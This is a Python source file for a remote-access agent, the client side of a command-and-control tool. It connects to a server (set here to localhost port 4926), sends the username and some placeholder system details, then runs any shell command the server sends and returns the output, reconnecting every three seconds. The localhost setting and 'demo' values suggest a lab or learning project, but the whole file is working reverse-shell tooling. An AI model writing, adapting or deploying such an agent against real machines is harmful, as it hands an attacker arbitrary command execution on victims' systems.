import socket
import json
import uuid
import time
import platform
import getpass
import subprocess
import random


SERVER_IP = "127.0.0.1"
SERVER_PORT = 4926
RECONNECT_DELAY = 3


# ========================
# Utils
# ========================
def recv_full(sock, n):
    data = b''
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        except:
            return None
    return data


def send_packet(sock, data_dict):
    try:
        payload = json.dumps(data_dict).encode()
        length = len(payload).to_bytes(4, byteorder='big')
        sock.sendall(length + payload)
    except:
        return False
    return True


# ========================
# System Info
# ========================

def collect_info():
    return {
        'uuid': str(uuid.uuid4()),
        'hostname': f"client-{random.randint(1000,9999)}",
        'username': getpass.getuser(),
        'os': random.choice(["Windows", "Ubuntu", "Kali"]),
        'os_version': "demo",
        'arch': platform.machine()
    }


# ========================
# Command Execution
# ========================
def execute_command(cmd):
    try:
        result = subprocess.getoutput(cmd)
        return result
    except Exception as e:
        return f"Error: {e}"


# ========================
# Main Agent Loop
# ========================
def run_agent():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10)

        try:
            print("[*] Connecting to server...")
            client.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected")

            # Register
            info = collect_info()
            register_packet = {
                'type': 'register',
                'data': info
            }

            send_packet(client, register_packet)

            # Main loop
            while True:
                raw_len = recv_full(client, 4)
                if not raw_len:
                    print("[!] Server disconnected")
                    break

                msg_len = int.from_bytes(raw_len, 'big')

                payload = recv_full(client, msg_len)
                if not payload:
                    print("[!] Server disconnected")
                    break

                try:
                    msg = json.loads(payload.decode())
                except:
                    continue

                header = msg.get('header')
                data = msg.get('data')

                print(f"[DEBUG] Received: {header} -> {data}")

                # ========================
                # Handle commands
                # ========================
                if header == 'command':

                    if data == 'agent.exit':
                        print("[*] Exit command received")
                        return

                    # Execute shell command
                    output = execute_command(data)

                    response = {
                        'header': 'result',
                        'data': output
                    }

                    send_packet(client, response)

        except Exception as e:
            print(f"[!] Connection error: {e}")

        finally:
            client.close()
            print(f"[*] Reconnecting in {RECONNECT_DELAY}s...\n")
            time.sleep(RECONNECT_DELAY)


# ========================
# Entry
# ========================
if __name__ == "__main__":
    run_agent()